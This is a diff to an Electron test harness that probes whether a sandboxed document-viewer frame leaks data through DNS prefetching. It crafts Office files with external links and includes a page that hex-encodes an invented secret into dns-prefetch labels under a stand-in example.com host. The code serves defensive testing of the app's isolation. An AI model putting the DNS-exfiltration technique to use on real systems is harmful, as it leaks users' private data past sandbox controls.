@@ -8,7 +8,8 @@
 // src="maws-viewer://<32 hex>/viewer.html?format=…">`, bytes in by postMessage after `ready`. Main only observes
 // (no request filter, no permission handler, no WebRTC policy, no navigation guard) unless --variant says otherwise.
 // Architecture B: the same page as the top-level document of a WebContentsView with a session of its own.
-import { app, BrowserWindow, Menu, WebContentsView, ipcMain, protocol, session } from 'electron';
+import { app, BrowserWindow, Menu, WebContentsView, ipcMain, nativeTheme, protocol, session } from 'electron';
+import JSZip from 'jszip';
 import { execFile } from 'node:child_process';
 import { randomBytes } from 'node:crypto';
 import { existsSync, mkdirSync, readFileSync, readlinkSync, statSync, writeFileSync } from 'node:fs';
@@ -20,14 +21,18 @@ import { promisify } from 'node:util';
 const here = dirname(fileURLToPath(import.meta.url));
 const argv = Object.fromEntries(process.argv.slice(2).filter((a) => a.startsWith('--')).map((a) => { const [k, ...v] = a.slice(2).split('='); return [k, v.join('=') || true]; }));
 const SUITE = argv.suite ?? 'basic';
+const NARROW = /dns|appframe/.test(SUITE); // the DNS follow-up puts a control window beside the app's
 const VARIANT = argv.variant ?? 'as-specified';
 // A variant is a `+`-joined set of layers added to the setup as specified (the result of the setup as specified is
 // always the `as-specified` run): rtcpolicy (the window's setWebRTCIPHandlingPolicy('disable_non_proxied_udp'), as the
 // app's guardFrames), deadproxy (the window's session proxied to a port that reaches nothing, loopback included),
-// perms (permission handlers that refuse maws-viewer: frames), nodnsprefetch (the viewer's answers carry
+// perms (permission handlers that refuse maws-viewer: frames), noprefetch (app.commandLine.appendSwitch('blink-settings',
+// 'dnsPrefetchingEnabled=false') before ready), offline (the frame's or view's session in offline emulation), nodnsprefetch (the viewer's answers carry
 // `X-DNS-Prefetch-Control: off`), anchor (B: main moves the view with the window's resize), applayers (the app's request filter, window-open deny).
 const LAYERS = new Set(VARIANT === 'as-specified' ? [] : VARIANT.split('+'));
 if (LAYERS.has('app-layers')) for (const l of ['applayers', 'rtcpolicy', 'perms']) LAYERS.add(l);
+// variant `noprefetch`: Blink's dnsPrefetchingEnabled setting off for every renderer, set the way the app would set it
+if (LAYERS.has('noprefetch')) app.commandLine.appendSwitch('blink-settings', 'dnsPrefetchingEnabled=false');
 const RUNS = argv.runs ?? join(here, 'runs');
 const SAMPLES = argv.samples ?? process.env.VIEWER_SPIKE_SAMPLES ?? join(homedir(), 'preview-probe', 'samples');
 const VIEWER_DIR = join(here, 'out', 'viewer');
@@ -59,6 +64,9 @@ const POLICIES = {
   'b-word': policy({ script: 'maws-viewer:', connect: 'maws-viewer:' }),
   'b-word-noblock': policy({ script: 'maws-viewer:', connect: 'maws-viewer:', webrtc: false }),
   none: null, // the control: an unrestricted page
+  // the DNS follow-up's patched-factory mode: every HTML string sink goes through the page's Trusted Types default policy
+  'word-tt': `${policy({ script: 'maws-viewer:', connect: "'none'" })}; require-trusted-types-for 'script'; trusted-types default raw`,
+  'excel-tt': `${policy({ script: "maws-viewer: 'wasm-unsafe-eval'", connect: 'maws-viewer: data: blob:' })}; require-trusted-types-for 'script'; trusted-types default raw`,
 };
 const byFormat = (format) => (format === 'xlsx' ? 'excel' : 'word');
 const hostPolicy = new Map(); // host -> a POLICIES key; the spike's harness chooses, a product would not
@@ -95,8 +103,11 @@ async function viewerScheme(request) {
   return new Response(request.method === 'HEAD' ? null : body, { status: 200, headers: { ...headers, 'Content-Type': TYPES[extname(name)] ?? 'application/octet-stream' } });
 }
 // The app's store scheme, standing for "an artifact the frame must not reach": a listener that logs.
+const artifactPages = new Map(); // path -> { html, csp }: the HTML-artifact frame of the DNS follow-up
 function artifactScheme(request) {
   artifactLog.push({ at: since(), url: request.url });
+  const page = artifactPages.get(new URL(request.url).pathname);
+  if (page) return new Response(page.html, { status: 200, headers: { 'Content-Type': 'text/html', 'X-Content-Type-Options': 'nosniff', 'Content-Security-Policy': page.csp, 'Cache-Control': 'no-store' } });
   return new Response('artifact', { status: 200, headers: { 'Content-Type': 'text/plain' } });
 }
 
@@ -191,7 +202,7 @@ async function setupA() {
   if (LAYERS.has('perms')) installPermissionRefusal(ses);
   if (LAYERS.has('deadproxy')) await ses.setProxy({ proxyRules: 'http=127.0.0.1:9;https=127.0.0.1:9;socks=127.0.0.1:9', proxyBypassRules: '<-loopback>' });
   win = new BrowserWindow({
-    x: 0, y: 0, width: 1400, height: 900, title: 'viewer-frame-spike', show: true, backgroundColor: '#faf9f6',
+    x: 0, y: 0, width: NARROW ? 900 : 1400, height: 900, title: 'viewer-frame-spike', show: true, backgroundColor: '#faf9f6',
     webPreferences: { sandbox: true, contextIsolation: true, nodeIntegration: false, nodeIntegrationInSubFrames: false, webSecurity: true, preload: join(here, 'preload.cjs') },
   });
   observe(win.webContents, 'window');
@@ -240,6 +251,7 @@ async function openView({ format = 'docx', policyKey, bytes = null, draw = false
   ses.setPermissionRequestHandler((_wc, permission, cb) => { ev('view:permission-request', { permission }); cb(false); });
   ses.setPermissionCheckHandler((_wc, permission) => { ev('view:permission-check', { permission }); return false; });
   ses.on('will-download', (e, item) => { ev('view:will-download', { url: item.getURL() }); e.preventDefault(); });
+  if (LAYERS.has('offline')) ses.enableNetworkEmulation({ offline: true });
   const view = new WebContentsView({ webPreferences: { session: ses, sandbox: true, contextIsolation: true, nodeIntegration: false } });
   const wc = view.webContents;
   wc.setWebRTCIPHandlingPolicy('disable_non_proxied_udp');
@@ -300,7 +312,7 @@ async function setupB() {
   ipcMain.on('menu', (_e, open) => { if (layoutView) layoutView.view.setVisible(!open); });
   session.defaultSession.webRequest.onHeadersReceived((details, callback) => callback({ responseHeaders: { ...details.responseHeaders, 'Content-Security-Policy': [WINDOW_CSP] } }));
   win = new BrowserWindow({
-    x: 0, y: 0, width: 1400, height: 900, title: 'viewer-frame-spike', show: true, backgroundColor: '#faf9f6',
+    x: 0, y: 0, width: NARROW ? 900 : 1400, height: 900, title: 'viewer-frame-spike', show: true, backgroundColor: '#faf9f6',
     webPreferences: { sandbox: true, contextIsolation: true, nodeIntegration: false, webSecurity: true, preload: join(here, 'preload.cjs') },
   });
   observe(win.webContents, 'window');
@@ -1033,6 +1045,245 @@ suites['b-layout'] = async () => {
   }
   const worst = Math.max(...Object.values(zooms).flatMap((r) => Object.values(r.delta).map(Math.abs)));
   report('B3', 'zoom', worst <= 1 && Object.values(zooms).every((r) => r.cyan < 2000) ? 'pass' : 'fail', Object.entries(zooms).map(([z, r]) => `${Math.round(z * 100)}%: slot ${r.want.x.toFixed(1)},${r.want.y.toFixed(1)}..${r.want.right.toFixed(1)},${r.want.bottom.toFixed(1)} DIP, view drawn ${r.got.x},${r.got.y}..${r.got.right},${r.got.bottom}, edge deltas ${Object.values(r.delta).map((d) => d.toFixed(1)).join('/')} px, exposed slot pixels ${r.cyan}`).join('; '), zooms);
+};
+
+// ---- the DNS follow-up (2026-11-14) ---------------------------------------------------------------------------------
+// Which carriers send a name the page chooses to the resolver, under which settings, and with what control beside it.
+// Names are `<tok>-<phase>-<carrier>.example.com`; the capture is read only for names with the run's token, and a name
+// is reported up to `.example.com` (the resolver's search domains, which follow it, are never printed).
+function dnsQueries(fromOffset, tok) {
+  const file = argv['dns-log'];
+  if (!file || !existsSync(file)) return null;
+  const out = [];
+  for (const l of readFileSync(file, 'utf8').slice(fromOffset).split('\n')) {
+    const m = /^(\d+):(\d+):([\d.]+)\s+(\S+)\s+(In|Out)\s+IP6?\s.*?\s(A|AAAA)\?\s(\S+)/.exec(l);
+    if (!m || !m[7].includes(tok)) continue;
+    out.push({ t: Number(m[1]) * 3600 + Number(m[2]) * 60 + Number(m[3]), iface: m[4], dir: m[5], name: m[7].split('.example.com')[0] });
+  }
+  return out;
+}
+const labelOf = (name, tok) => (name.startsWith(`${tok}-`) ? name.slice(tok.length + 1) : name.replace(/^([0-9a-f]+\.)+/, (h) => `(${h.split('.').length - 1} hex labels).`).replace(`${tok}-`, ''));
+const CARRIERS = ['link-script', 'link-inner', 'mo-removed-link', 'preconnect', 'a-parse', 'a-hover', 'a-down', 'detached-never', 'detached-never-a', 'detached-filtered-link', 'detached-filtered-a'];
+const carriersSource = () => readFileSync(join(here, 'viewer', 'carriers.js'), 'utf8').replace('export async function carriers', 'async function carriers');
+
+async function hoverAndPress(origin, rects) {
+  if (!xdotool || !rects?.hover) return 'no real input';
+  const at = (q) => [Math.round(origin.x + q.x), Math.round(origin.y + q.y)];
+  await xdo('mousemove', ...at(rects.hover)); await sleep(900);
+  await xdo('mousemove', ...at(rects.down)); await sleep(200);
+  await xdo('mousedown', 1); await sleep(600);
+  await xdo('mousemove', ...at(rects.away)); await sleep(100);
+  await xdo('mouseup', 1); await sleep(300);
+  return 'hovered, pressed (no click)';
+}
+async function frameOrigin(id) { const b = win.getContentBounds(); const r = await A.call('frameRect', id); return { x: b.x + r.x, y: b.y + r.y }; }
+
+// The control: a window on a session of its own (standing for the in-app browser), on an http page, the same carriers.
+async function standin(p, tok) {
+  const ses = session.fromPartition('standin');
+  const w = new BrowserWindow({ x: 910, y: 0, width: 680, height: 800, show: true, title: 'standin', webPreferences: { session: ses, sandbox: true, contextIsolation: true } });
+  const res = {};
+  try { await withTimeout(w.loadURL('http://example.com/'), 15000, 'load'); res.example = `loaded "${w.webContents.getTitle()}"`; } catch (e) { res.example = `failed: ${String(e).slice(0, 80)}`; }
+  await w.loadURL(`http://127.0.0.1:${p[0].http}/${tok}/page`);
+  const rects = await w.webContents.executeJavaScript(`${carriersSource()}; carriers(${JSON.stringify({ tok, phase: 'standin' })})`);
+  const b = w.getContentBounds();
+  res.input = await hoverAndPress({ x: b.x, y: b.y }, rects);
+  return res;
+}
+
+function reportDns(arch, tok, offset, phases, control) {
+  const q = dnsQueries(offset, tok);
+  if (q === null) { report('dns', `${arch} capture`, 'not-run', 'no DNS capture (needs tcpdump without a password)'); return; }
+  const seen = (phase) => { const lo = new Set(), out = new Set(); for (const e of q) { const l = labelOf(e.name, tok); if (!l.startsWith(`${phase}-`)) continue; const c = l.slice(phase.length + 1); (e.iface === 'lo' ? lo : out).add(c); } return { lo: [...lo], out: [...out] }; };
+  for (const [phase, label] of phases) {
+    const s = seen(phase);
+    const left = [...new Set([...s.lo, ...s.out])];
+    report('dns', `${arch} ${phase}`, left.length ? 'fail' : 'pass', `${label}: names sent ${left.length ? left.join(', ') : 'none'}${s.out.length ? `; of them out of the machine (not loopback): ${s.out.join(', ')}` : ''}; not sent: ${CARRIERS.filter((c) => !left.includes(c)).join(', ')}`, s);
+  }
+  const s = seen('standin');
+  report('dns', `${arch} control`, 'record', `control (own session, http page, real input): ${control.example}; names sent ${s.lo.concat(s.out).filter((v, i, a) => a.indexOf(v) === i).join(', ') || 'none'}; input ${control.input}`, s);
+}
+
+const DNS_PHASES = [['plain', 'viewer.html', false, 'wrapper without meta'], ['metaoff', 'viewer-meta.html', false, 'wrapper with x-dns-prefetch-control off first'], ['metaon', 'viewer-meta.html', true, 'off first, then a meta "on" later in the body']];
+suites.dns = async () => {
+  await setupA();
+  if (LAYERS.has('offline')) session.defaultSession.enableNetworkEmulation({ offline: true });
+  const p = ports();
+  const tok = `t${mint().slice(0, 10)}`;
+  const offset = logSize(argv['dns-log']);
+  for (const [phase, page, metaOnLater] of DNS_PHASES) {
+    await A.addFrame(phase, { host: mint(), format: 'docx', page });
+    const rects = await A.call('test', phase, 'carriers', { tok, phase, metaOnLater });
+    await hoverAndPress(await frameOrigin(phase), rects);
+    await sleep(400);
+    await A.call('removeFrame', phase);
+  }
+  // a frame made before a theme change (which sends the renderers new web preferences), its carriers inserted after it,
+  // and the window zoomed: whether a preferences update turns prefetching back on under a switch that turned it off
+  await A.addFrame('aftertheme', { host: mint(), format: 'docx' });
+  nativeTheme.themeSource = 'dark';
+  await sleep(600);
+  nativeTheme.themeSource = 'light';
+  win.webContents.setZoomFactor(1.1);
+  await sleep(600);
+  const rects = await A.call('test', 'aftertheme', 'carriers', { tok, phase: 'aftertheme' });
+  await hoverAndPress(await frameOrigin('aftertheme'), rects);
+  await A.call('removeFrame', 'aftertheme');
+  win.webContents.setZoomFactor(1);
+  const control = await standin(p, tok);
+  await sleep(3000);
+  reportDns('A', tok, offset, [...DNS_PHASES.map(([ph, , , label]) => [ph, label]), ['aftertheme', 'a frame made before a theme change and a zoom, its carriers inserted after']], control);
+};
+suites['b-dns'] = async () => {
+  await setupB();
+  const p = ports();
+  const tok = `t${mint().slice(0, 10)}`;
+  const offset = logSize(argv['dns-log']);
+  for (const [phase, page, metaOnLater] of DNS_PHASES) {
+    const v = await openView({ format: 'docx', page, bounds: { x: 280, y: 20, width: 600, height: 700 } });
+    const rects = await v.test('carriers', { tok, phase, metaOnLater });
+    const b = win.getContentBounds();
+    await hoverAndPress({ x: b.x + 280, y: b.y + 20 }, rects);
+    await sleep(400);
+    v.close();
+  }
+  const control = await standin(p, tok);
+  await sleep(3000);
+  reportDns('B', tok, offset, DNS_PHASES.map(([ph, , , label]) => [ph, label]), control);
+};
+
+// Crafted files: the sample with one external hyperlink to a name of the run's.
+async function crafted(format, host) {
+  const zip = await JSZip.loadAsync(sample(`sample.${format}`));
+  const R = 'http://schemas.openxmlformats.org/officeDocument/2006/relationships';
+  const rel = `<Relationship Id="rIdSpike1" Type="${R}/hyperlink" Target="http://${host}/" TargetMode="External"/>`;
+  const addRel = async (path) => { const f = zip.file(path); const x = f ? await f.async('string') : `<?xml version="1.0" encoding="UTF-8" standalone="yes"?><Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships"></Relationships>`; zip.file(path, x.replace('</Relationships>', `${rel}</Relationships>`)); };
+  const withR = (xml, root) => (xml.includes('xmlns:r=') ? xml : xml.replace(`<${root} `, `<${root} xmlns:r="${R}" `));
+  if (format === 'docx') {
+    await addRel('word/_rels/document.xml.rels');
+    const doc = withR(await zip.file('word/document.xml').async('string'), 'w:document');
+    zip.file('word/document.xml', doc.replace(/<w:body>/, '<w:body><w:p><w:hyperlink r:id="rIdSpike1"><w:r><w:t>spike link</w:t></w:r></w:hyperlink></w:p>'));
+  } else if (format === 'pptx') {
+    await addRel('ppt/slides/_rels/slide1.xml.rels');
+    let x = withR(await zip.file('ppt/slides/slide1.xml').async('string'), 'p:sld');
+    const i = x.indexOf('<a:r>');
+    const j = x.indexOf('<a:t>', i);
+    const run = x.slice(i, j);
+    const link = '<a:hlinkClick r:id="rIdSpike1"/>';
+    let fixed;
+    if (/<a:rPr[^>]*\/>/.test(run)) fixed = run.replace(/<a:rPr([^>]*)\/>/, `<a:rPr$1>${link}</a:rPr>`);
+    else if (run.includes('</a:rPr>')) fixed = run.replace('</a:rPr>', `${link}</a:rPr>`);
+    else fixed = `${run}<a:rPr>${link}</a:rPr>`;
+    x = x.slice(0, i) + fixed + x.slice(j);
+    zip.file('ppt/slides/slide1.xml', x);
+  } else {
+    await addRel('xl/worksheets/_rels/sheet1.xml.rels');
+    let x = withR(await zip.file('xl/worksheets/sheet1.xml').async('string'), 'worksheet');
+    const tag = '<hyperlinks><hyperlink ref="A1" r:id="rIdSpike1"/></hyperlinks>';
+    const at = ['<printOptions', '<pageMargins', '<pageSetup', '</worksheet>'].map((t) => x.indexOf(t)).find((k) => k >= 0);
+    x = x.slice(0, at) + tag + x.slice(at);
+    zip.file('xl/worksheets/sheet1.xml', x);
+  }
+  return zip.generateAsync({ type: 'nodebuffer' });
+}
+
+suites['dns-libs'] = async () => {
+  await setupA();
+  const tok = `t${mint().slice(0, 10)}`;
+  const offset = logSize(argv['dns-log']);
+  const modes = [['live', 'viewer.html', null, 'live, as specified'], ['metalive', 'viewer-meta.html', null, 'live, wrapper meta off'], ['detached', 'viewer-meta.html', 'detached', 'rendered detached, filtered, attached (meta off)'], ['factory', 'viewer-meta.html', 'factory', 'patched element factory + Trusted Types default policy (meta off)']];
+  const results = {};
+  for (const lib of ['docx', 'pptx', 'xlsx']) {
+    for (const [mode, page, drawMode, label] of modes) {
+      const phase = `${lib}${mode}`;
+      const host = mint();
+      if (drawMode === 'factory') hostPolicy.set(host, lib === 'xlsx' ? 'excel-tt' : 'word-tt');
+      const bytes = await crafted(lib, `${tok}-${phase}-file-link.example.com`);
+      await A.addFrame(phase, { host, format: lib, page, width: 470, height: 400 });
+      const r = await A.call('test', phase, 'draw-lib', { format: lib, b64: b64(bytes), mode: drawMode ?? 'live', tok }, 60000);
+      const fr = await frameOrigin(phase);
+      r.input = r.anchor ? await hoverAndPress(fr, { hover: r.anchor, down: r.anchor, away: { x: 460, y: 390 } }) : 'no anchor to hover';
+      results[phase] = { ...r, label };
+      await sleep(400);
+      await A.call('removeFrame', phase);
+    }
+  }
+  await sleep(3000);
+  const q = dnsQueries(offset, tok) ?? [];
+  for (const [phase, r] of Object.entries(results)) {
+    const sent = [...new Set(q.filter((e) => labelOf(e.name, tok).startsWith(`${phase}-`)).map((e) => labelOf(e.name, tok).slice(phase.length + 1)))];
+    const drew = !r.error && (r.after.nodes > 3 || r.after.canvases > 0);
+    report('dns', `libs ${phase}`, sent.length ? 'fail' : 'pass', `${r.label}: ${r.error ? `draw failed (${r.error.slice(0, 80)})` : `drew in ${r.ms} ms`}${r.beforeAttach ? `; detached before attaching: ${r.beforeAttach.nodes} nodes, ${r.beforeAttach.text} chars, ${r.beforeAttach.canvases} canvases` : ''}; attached: ${r.after.nodes} nodes, ${r.after.text} chars, ${r.after.canvases} canvases${r.tt ? `; trusted types ${r.tt}` : ''}; the file's URL in the DOM as ${r.after.tokUrls.join(', ') || 'nothing'}; ${r.input}; names sent: ${sent.join(', ') || 'none'}${drew ? '' : ' (DID NOT DRAW)'}`, r);
+  }
+};
+
+suites['dns-burst'] = async () => {
+  await setupA();
+  const tok = `t${mint().slice(0, 10)}`;
+  const host = mint();
+  const count = (off, label) => { const q = (dnsQueries(off, tok) ?? []).filter((e) => labelOf(e.name, tok).startsWith(`${label}-`)); const lo = q.filter((e) => e.iface === 'lo'); const ts = lo.map((e) => e.t); return { names: new Set(lo.map((e) => e.name)).size, queries: lo.length, outNames: new Set(q.filter((e) => e.iface !== 'lo').map((e) => e.name)).size, spanS: ts.length ? +(Math.max(...ts) - Math.min(...ts)).toFixed(1) : 0 }; };
+  await A.addFrame('b', { host, format: 'docx' });
+  let off = logSize(argv['dns-log']);
+  const r1 = await A.call('test', 'b', 'burst', { tok, label: 'k1', from: 0, count: 1000 });
+  await sleep(15000);
+  const c1 = count(off, 'k1');
+  off = logSize(argv['dns-log']);
+  const r2 = await A.call('test', 'b', 'burst', { tok, label: 'k5', from: 0, count: 5000 });
+  await sleep(25000);
+  const c2 = count(off, 'k5');
+  // the same 100 names again in the same page, then after a reload (the frame removed and added again, same host and URL)
+  off = logSize(argv['dns-log']);
+  await A.call('test', 'b', 'burst', { tok, label: 'k1', from: 0, count: 100 });
+  await sleep(6000);
+  const c3 = count(off, 'k1');
+  await A.call('removeFrame', 'b');
+  await A.addFrame('b', { host, format: 'docx' });
+  off = logSize(argv['dns-log']);
+  await A.call('test', 'b', 'burst', { tok, label: 'k1', from: 0, count: 100 });
+  await sleep(6000);
+  const c4 = count(off, 'k1');
+  report('dns', 'bandwidth', 'record', `1000 names inserted in ${r1.ms} ms: ${c1.names} distinct names reached the resolver (${c1.queries} queries, over ${c1.spanS} s; ${c1.outNames} distinct names in queries leaving the machine); 5000 names in ${r2.ms} ms: ${c2.names} distinct (${c2.queries} queries, over ${c2.spanS} s; ${c2.outNames} out); the first 100 again in the same page: ${c3.names} re-sent; after a reload: ${c4.names} re-sent`, { c1, c2, c3, c4 });
+};
+
+// The app's existing HTML-artifact frame, as master builds it: `maws-artifact:` answered with STORE_FRAME_CSP
+// (src/services/artifacts/scheme/scheme-handler.ts), `<iframe sandbox="allow-scripts" referrerPolicy="no-referrer">`
+// (HtmlFrame.tsx), the window's guardFrames (WebRTC policy and the subframe navigation guard), the session's request
+// filter and permission handlers (src/render/policies.ts: installFramePolicies, guardPermissions('store-frames')).
+const STORE_FRAME_CSP = ['sandbox allow-scripts', "default-src 'none'", "script-src 'unsafe-inline' 'unsafe-eval' data: blob:", "style-src 'unsafe-inline' data: blob:", 'img-src data: blob:', 'font-src data: blob:', 'media-src data: blob:', 'connect-src data: blob:', 'worker-src blob:', "frame-src 'none'", "object-src 'none'", "base-uri 'none'", "form-action 'none'"].join('; ');
+function installStoreFrameLayers(ses, wc) {
+  const beneath = (f) => { try { for (let c = f; c; c = c.parent) if (c.url.startsWith('maws-artifact://')) return true; return false; } catch { return null; } };
+  const allowed = (u) => ['maws-artifact://', 'chrome-extension://mhjfbmdgcfjbbpaeojofohoefgiehjai/', 'chrome://resources/'].some((x) => u.startsWith(x));
+  ses.webRequest.onBeforeRequest({ urls: ['<all_urls>'] }, (d, cb) => { const cancel = !allowed(d.url) && (beneath(d.frame) === true || (d.initiatorOrigin ?? '').startsWith('maws-artifact://')); if (cancel) ev('store:cancelled', { url: d.url.slice(0, 120) }); cb({ cancel }); });
+  const store = (o) => typeof o === 'string' && o.startsWith('maws-artifact://');
+  ses.setPermissionRequestHandler((_wc, _p, cb, d) => cb(!(store(d.requestingUrl) || store(d.securityOrigin))));
+  ses.setPermissionCheckHandler((_wc, permission, origin, d) => permission !== 'deprecated-sync-clipboard-read' && !(store(origin) || store(d.requestingUrl) || store(d.securityOrigin)));
+  wc.setWebRTCIPHandlingPolicy('disable_non_proxied_udp');
+  wc.on('will-frame-navigate', (e) => { if (e.isMainFrame || allowed(e.url)) return; if (beneath(e.frame) !== false || beneath(e.initiator) === true) { e.preventDefault(); ev('store:blocked-navigation', { url: e.url }); } });
+}
+suites.appframe = async () => {
+  await setupA();
+  installStoreFrameLayers(session.defaultSession, win.webContents);
+  const p = ports();
+  const tok = `t${mint().slice(0, 10)}`;
+  const offset = logSize(argv['dns-log']);
+  const secret = 'invented owner note: account 4421, meeting Tuesday';
+  const page = `<!doctype html><html><head><meta charset="utf-8"><script>${carriersSource()}
+addEventListener('DOMContentLoaded', () => carriers(${JSON.stringify({ tok, phase: 'appframe' })}).then((rects) => {
+  const text = document.getElementById('secret').textContent;
+  const hex = Array.from(new TextEncoder().encode(text), (b) => b.toString(16).padStart(2, '0')).join('');
+  const l = document.createElement('link'); l.rel = 'dns-prefetch'; l.href = '//' + hex.match(/.{1,60}/g).join('.') + '.${tok}-appframe-data.example.com'; document.head.append(l);
+  parent.postMessage({ type: 'ready', rects, bytes: text.length }, '*');
+}));</script></head><body><p id="secret">${secret}</p></body></html>`;
+  artifactPages.set('/page.html', { html: page, csp: STORE_FRAME_CSP });
+  const ready = await A.call('addFrame', 'art', { src: `maws-artifact://${mint()}/page.html`, referrerPolicy: 'no-referrer' });
+  await hoverAndPress(await frameOrigin('art'), ready.rects);
+  await sleep(3000);
+  const q = dnsQueries(offset, tok) ?? [];
+  const names = [...new Set(q.map((e) => labelOf(e.name, tok)))];
+  const data = q.find((e) => e.name.includes('appframe-data'));
+  const decoded = data ? Buffer.from(data.name.split(`.${tok}`)[0].replace(/\./g, ''), 'hex').toString('utf8') : null;
+  report('dns', 'app HTML frame', names.length ? 'fail' : 'pass', `the app's HTML-artifact frame (STORE_FRAME_CSP, sandbox allow-scripts, the store-frame layers): names sent ${names.join(', ') || 'none'}; the page's own text, hex-encoded into labels, ${decoded === secret ? `arrived whole at the resolver (${ready.bytes} bytes in one name)` : decoded ? 'arrived altered' : 'did not leave'}; cancelled requests ${events.filter((e) => e.type === 'store:cancelled').length}`, { names });
+  void p;
 };
 
 // ---- run ------------------------------------------------------------------------------------------------------------
